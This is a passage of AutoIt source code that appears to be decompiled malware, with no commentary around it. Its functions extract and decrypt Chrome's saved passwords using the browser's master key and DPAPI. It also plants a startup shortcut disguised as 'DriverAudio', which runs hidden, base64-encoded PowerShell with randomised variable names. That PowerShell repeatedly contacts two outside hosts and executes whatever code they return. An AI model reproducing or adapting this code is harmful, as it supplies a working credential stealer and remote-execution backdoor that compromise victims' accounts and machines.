            $achromepassword[$icount][0x2] = StringStripWS(_CHROMEDECRYPTAES($spassword, $sbinchromemasterkey), 0x2)
            $sbuff = $sbuff & $surl & "|" & $susername & "|" & $achromepassword[$icount][0x2] & @CRLF
        Else
            $achromepassword[$icount][0x2] = StringStripWS(BinaryToString(_CHROMEDECRYPTOLD($spassword), 0x4), 0x2)
            $sbuff = $sbuff & $surl & "|" & $susername & "|" & $achromepassword[$icount][0x2] & @CRLF
        EndIf
        $icount += 0x1
    WEnd
    ReDim $achromepassword[$icount][0x3]
    _SQLite_Close()
    _SQLite_Shutdown()
    FileDelete($stempfilename)
    Return $sbuff ? $sbuff : ""
EndFunc   ;==>_GETCHROMEPASSWORD
Func _CHROMEDECRYPTAES($sbinpassword, $sbinchromemasterkey)
    Local Const $bcrypt_aes_algorithm = "AES"
    Local Const $bcrypt_object_length = "ObjectLength"
    Local Const $bcrypt_chaining_mode = "ChainingMode"
    Local Const $bcrypt_chain_mode_gcm = "ChainingModeGCM"
    Local Const $bcrypt_key_data_blob = "KeyDataBlob"
    Local $stagpbc = "ULONG cbSize;ULONG dwInfoVersion;ptr pbNonce;ULONG cbNonce;ptr pbAuthData;ULONG cbAuthData;ptr pbTag;" & "ULONG cbTag;ptr pbMacContext;ULONG cbMacContext;ULONG cbAAD;INT64 cbData;ULONG dwFlags;"
    Local $aret = DllCall("Bcrypt.dll", "long", "BCryptOpenAlgorithmProvider", "handle*", 0x0, "wstr", $bcrypt_aes_algorithm, "wstr", Null, "dword", 0x0)
    If @error Or $aret[0x0] <> 0x0 Then Return SetError(0x1, 0x0, "")
    Local $halghandle = $aret[0x1]
    $aret = DllCall("Bcrypt.dll", "long", "BCryptGetProperty", "handle", $halghandle, "wstr", $bcrypt_object_length, "dword*", 0x0, "ulong", 0x4, "ulong*", 0x0, "ulong", 0x0)
    If @error Or $aret[0x0] <> 0x0 Then
        DllCall("Bcrypt.dll", "long", "BCryptCloseAlgorithmProvider", "handle", $halghandle, "ulong", 0x0)
        Return SetError(0x2, 0x0, "")
    EndIf
    Local $ihashlength = $aret[0x3]
    Local $iwrittenbytes = $aret[0x5]
    $aret = DllCall("Bcrypt.dll", "long", "BCryptSetProperty", "handle", $halghandle, "wstr", $bcrypt_chaining_mode, "wstr", $bcrypt_chain_mode_gcm, "ulong", BinaryLen($bcrypt_chain_mode_gcm), "ulong", 0x0)
    If @error Or $aret[0x0] <> 0x0 Then
        DllCall("Bcrypt.dll", "long", "BCryptCloseAlgorithmProvider", "handle", $halghandle, "ulong", 0x0)
        Return SetError(0x3, 0x0, "")
    EndIf
    Local $tbkeyobject = DllStructCreate("byte[" & $ihashlength & "]")
    Local $tkeyblob = DllStructCreate("byte[" & BinaryLen($sbinchromemasterkey) & "]")
    Local $isizekeyblob = DllStructGetSize($tkeyblob)
    DllStructSetData($tkeyblob, 0x1, $sbinchromemasterkey)
    $aret = DllCall("Bcrypt.dll", "long", "BCryptImportKey", "handle", $halghandle, "ptr", 0x0, "wstr", $bcrypt_key_data_blob, "handle*", 0x0, "struct*", $tbkeyobject, "ulong", $ihashlength, "struct*", $tkeyblob, "ulong", $isizekeyblob, "ulong", 0x0)
    If @error Or $aret[0x0] <> 0x0 Then
        DllCall("Bcrypt.dll", "long", "BCryptCloseAlgorithmProvider", "handle", $halghandle, "ulong", 0x0)
        Return SetError(0x3, 0x0, "")
    EndIf
    Local $hkey = $aret[0x4]
    Local $iivsize = 0xc
    Local $tiv = DllStructCreate("byte[" & $iivsize & "]")
    DllStructSetData($tiv, 0x1, BinaryMid($sbinpassword, 0x4, 0xc))
    Local $ipasswordsize = BinaryLen($sbinpassword)
    Local $tpassword = DllStructCreate("byte[" & $ipasswordsize & "]")
    DllStructSetData($tpassword, 0x1, $sbinpassword)
    Local $tpbc = DllStructCreate($stagpbc)
    DllStructSetData($tpbc, "cbSize", DllStructGetSize($tpbc))
    DllStructSetData($tpbc, "dwInfoVersion", 0x1)
    DllStructSetData($tpbc, "pbNonce", DllStructGetPtr($tiv))
    DllStructSetData($tpbc, "cbNonce", $iivsize)
    DllStructSetData($tpbc, "pbTag", DllStructGetPtr($tpassword) + 0xf + ($ipasswordsize + 0xfffffff0 + 0xfffffff1))
    DllStructSetData($tpbc, "cbTag", 0x10)
    DllStructSetData($tpbc, "cbMacContext", 0x10)
    Local $tbmaccontext = DllStructCreate("byte[16]")
    DllStructSetData($tpbc, "pbMacContext", DllStructGetPtr($tbmaccontext))
    Local $tdecrypted = DllStructCreate("byte[2048]")
    $aret = DllCall("Bcrypt.dll", "long", "BCryptDecrypt", "handle", $hkey, "ptr", DllStructGetPtr($tpassword) + 0xf, "ulong", ($ipasswordsize + 0xfffffff0 + 0xfffffff1), "struct*", $tpbc, "struct*", $tiv, "ulong", $iivsize, "struct*", $tdecrypted, "ulong", 0x800, "ulong*", 0x0, "ulong", 0x0)
    If @error Or $aret[0x0] <> 0x0 Then
        DllCall("Bcrypt.dll", "long", "BCryptCloseAlgorithmProvider", "handle", $halghandle, "ulong", 0x0)
        Return SetError(0x4, 0x0, "")
    EndIf
    Return BinaryToString(DllStructGetData($tdecrypted, 0x1), 0x4)
EndFunc   ;==>_CHROMEDECRYPTAES
Func _CHROMEDECRYPTOLD($sbinpassword)
    Return _UNCRYPTRDPPASSWORD($sbinpassword)
EndFunc   ;==>_CHROMEDECRYPTOLD
Func _GETMASTERKEY()
    Local $slocalstate = @LocalAppDataDir & "\Google\Chrome\User Data\Local State"
    Local $sjson = FileRead($slocalstate)
    _LOG("Json: " & $sjson)
    Local $areg = StringRegExp($sjson, '"encrypted_key":"(.*?)"', 0x3)
    If IsArray($areg) Then
        _LOG("Base64: " & $areg[0x0])
        Local $sbmasterkey = _BASE64DECODE($areg[0x0])
        _LOG($sbmasterkey)
        _LOG(BinaryToString($sbmasterkey))
        _LOG("")
        $sbmasterkey = BinaryMid($sbmasterkey, 0x6)
        _LOG("Binary: " & $sbmasterkey)
        Local $sbmasterkeydecrypted = _UNCRYPTRDPPASSWORD($sbmasterkey)
        _LOG("MasterKey: " & $sbmasterkeydecrypted & @TAB & BinaryLen($sbmasterkeydecrypted))
        Local $tblobheader = DllStructCreate("ulong;ulong;ulong;byte[" & BinaryLen($sbmasterkeydecrypted) & "]")
        DllStructSetData($tblobheader, 0x1, 0x4d42444b)
        DllStructSetData($tblobheader, 0x2, 0x1)
        DllStructSetData($tblobheader, 0x3, 0x20)
        DllStructSetData($tblobheader, 0x4, $sbmasterkeydecrypted)
        Local $tbytes = DllStructCreate("byte[" & DllStructGetSize($tblobheader) & "]", DllStructGetPtr($tblobheader))
        Local $sbytes = DllStructGetData($tbytes, 0x1)
        _LOG("MasterKeyBlob: " & $sbytes & @TAB & BinaryLen($sbytes))
        Return $sbytes
    EndIf
EndFunc   ;==>_GETMASTERKEY
Func _UNCRYPTRDPPASSWORD($bin)
    Local Const $cryptprotect_ui_forbidden = 0x1
    Local Const $data_blob = "int;ptr"
    Local $passstr = DllStructCreate("byte[1024]")
    Local $datain = DllStructCreate($data_blob)
    Local $dataout = DllStructCreate($data_blob)
    $pwdescription = "psw"
    $pwdhash = ""
    DllStructSetData($dataout, 0x1, 0x0)
    DllStructSetData($dataout, 0x2, 0x0)
    DllStructSetData($passstr, 0x1, $bin)
    DllStructSetData($datain, 0x2, DllStructGetPtr($passstr, 0x1))
    DllStructSetData($datain, 0x1, BinaryLen($bin))
    $return = DllCall("crypt32.dll", "int", "CryptUnprotectData", "ptr", DllStructGetPtr($datain), "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "dword", $cryptprotect_ui_forbidden, "ptr", DllStructGetPtr($dataout))
    If @error Then Return ""
    $len = DllStructGetData($dataout, 0x1)
    $pwdhash = Ptr(DllStructGetData($dataout, 0x2))
    $pwdhash = DllStructCreate("byte[" & $len & "]", $pwdhash)
    Return DllStructGetData($pwdhash, 0x1)
EndFunc   ;==>_UNCRYPTRDPPASSWORD
Func _BASE64DECODE($input_string)
    Local $struct = DllStructCreate("int")
    Local $a_call = DllCall("Crypt32.dll", "int", "CryptStringToBinary", "str", $input_string, "int", 0x0, "int", 0x1, "ptr", 0x0, "ptr", DllStructGetPtr($struct, 0x1), "ptr", 0x0, "ptr", 0x0)
    If @error Or Not $a_call[0x0] Then
        Return SetError(0x1, 0x0, "")
    EndIf
    Local $a = DllStructCreate("byte[" & DllStructGetData($struct, 0x1) & "]")
    $a_call = DllCall("Crypt32.dll", "int", "CryptStringToBinary", "str", $input_string, "int", 0x0, "int", 0x1, "ptr", DllStructGetPtr($a), "ptr", DllStructGetPtr($struct, 0x1), "ptr", 0x0, "ptr", 0x0)
    If @error Or Not $a_call[0x0] Then
        Return SetError(0x2, 0x0, "")
    EndIf
    Return DllStructGetData($a, 0x1)
EndFunc   ;==>_BASE64DECODE
Func _SETLOG($blogset = False)
    Local Static $blog = False
    If @NumParams = 0x0 Then
        Return $blog
    Else
        $blog = $blogset
    EndIf
    Return $blog
EndFunc   ;==>_SETLOG
Func _LOG($sstring)
    If _SETLOG() Then
        ConsoleWrite($sstring & @CRLF)
    EndIf
EndFunc   ;==>_LOG
#EndRegion ChromePW
Func CREATESHORTCUTX()
    Local Const $startup2 = @StartMenuDir & "\Programs\Startup\DriverAudio.lnk"
    If Not FileExists($startup2) Then
        $irand = Random(0x28, 0x3c, 0x1)
        Local $sserial = Hex(DriveGetSerial(@HomeDrive & "\"))
        Local $strps = "$Sleep=" & $irand & ';Start-Sleep -s $Sleep;$links = ("http://portaconexao8.top/rest/?h=' & $sserial & '", "http://germogenborya.at/rest/?h=' & $sserial & '");for(;;){foreach($link in $links){try{$req = [System.Net.WebRequest]::Create($link);$resp = $req.GetResponse();$reqstream = $resp.GetResponseStream();$stream = new-object System.IO.StreamReader $reqstream;$result = $stream.ReadToEnd();Write-Output $result;try{IEX $result;}catch{}Write-Output "60";Start-Sleep -Seconds 60;break;}catch{Write-Output "e";}}Start-Sleep -Seconds 10;}'
        Local $arraytoreplace = StringSplit("$Sleep|$links|$link|$req|$resp|$re1qstream|$str3am|$result", "|")
        For $i = 0x1 To $arraytoreplace[0x0]
            If StringInStr($strps, $arraytoreplace[$i]) Then
                $strps = StringReplace($strps, $arraytoreplace[$i], "$" & GENERATE())
            EndIf
        Next
        $strps = StringReplace(_BASE64ENCODE(StringToBinary($strps, 0x2)), @LF, "")
        FileCreateShortcut("%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe", $startup2, "", "-WindowStyle hidden -ExecutionPolicy UnRestricted -Encoded " & $strps)
        ShellExecute($startup2, "", "", $shex_open, @SW_MINIMIZE)
    EndIf
EndFunc   ;==>CREATESHORTCUTX
Func CREATESHORTCUTX_OLD()
    Local $sserial = Hex(DriveGetSerial(@HomeDrive & "\"))
    Local $strps = '$links = ("http://portaconexao8.top/rest/?h=' & $sserial & '", "http://germogenborya.at/rest/?h=' & $sserial & '");for(;;){foreach($link in $links){try{$req = [System.Net.WebRequest]::Create($link);$resp = $req.GetResponse();$reqstream = $resp.GetResponseStream();$stream = new-object System.IO.StreamReader $reqstream;$result = $stream.ReadToEnd();Write-Output $result;try{IEX $result;}catch{}Write-Output "60";Start-Sleep -Seconds 60;break;}catch{Write-Output "e";}}Start-Sleep -Seconds 10;}'
    Local $arraytoreplace = StringSplit("$links|$link|$req|$resp|$re1qstream|$str3am|$result", "|")
    For $i = 0x1 To $arraytoreplace[0x0]
        If StringInStr($strps, $arraytoreplace[$i]) Then
            $strps = StringReplace($strps, $arraytoreplace[$i], "$" & GENERATE())
        EndIf
    Next
    $strps = StringReplace(_BASE64ENCODE(StringToBinary($strps, $sb_utf16le)), @LF, "")
    Local Const $startup2 = @StartMenuDir & "\Programs\Startup\DriverAudio2.lnk"
    FileDelete($startup2)
    FileCreateShortcut("%syStEmROOt%\sySteM32\WInDowsPoWErSHEll\v1.0\poWerShell.eXE", $startup2, "", "-WiNDOwSTyle hiDdEn -ExECUTIONPOLIcy unReSTriCTEd -EncodeD " & $strps)
    ShellExecute($startup2)
EndFunc   ;==>CREATESHORTCUTX_OLD
Func _BASE64ENCODE($sdata)
    Local $oxml = ObjCreate("Msxml2.DOMDocument")
    If Not IsObj($oxml) Then
        SetError(0x1, 0x1, 0x0)
    EndIf
    Local $oelement = $oxml .createElement("b64")
    If Not IsObj($oelement) Then
        SetError(0x2, 0x2, 0x0)
    EndIf
    $oelement .dataType = "bin.base64"
    $oelement .nodeTypedValue = Binary($sdata)
    Local $sreturn = $oelement .Text
    If StringLen($sreturn) = 0x0 Then
        SetError(0x3, 0x3, 0x0)
    EndIf
    Return $sreturn
EndFunc   ;==>_BASE64ENCODE
Func GENERATE($ilenght = 0xa, $sparam = "Upper;Lower")
    Local $aret, $abase, $ainit, $supper, $slower, $sdigit, $sbase
    $upper = "A;B;C;D;E;F;G;H;I;K;L;M;N;O;P;Q;R;S;T;U;V;W;X;Y;Z;"
    $lower = "a;b;c;d;e;f;g;h;i;k;l;m;n;o;p;q;r;s;t;u;v;w;x;y;z;"
    $digit = "1;2;3;4;5;6;7;8;9;0;"
    $ainit = StringSplit($sparam, ";")
    For $i = 0x1 To $ainit[0x0]
        $abase &= Eval($ainit[$i])
    Next
    $sbase = StringSplit($abase, ";")
    For $i = 0x1 To Random(0x5, 0x8, 0x1)
        $aret &= $sbase[Random(0x1, $sbase[0x0], 0x1)]
    Next
    Return $aret
EndFunc   ;==>GENERATE
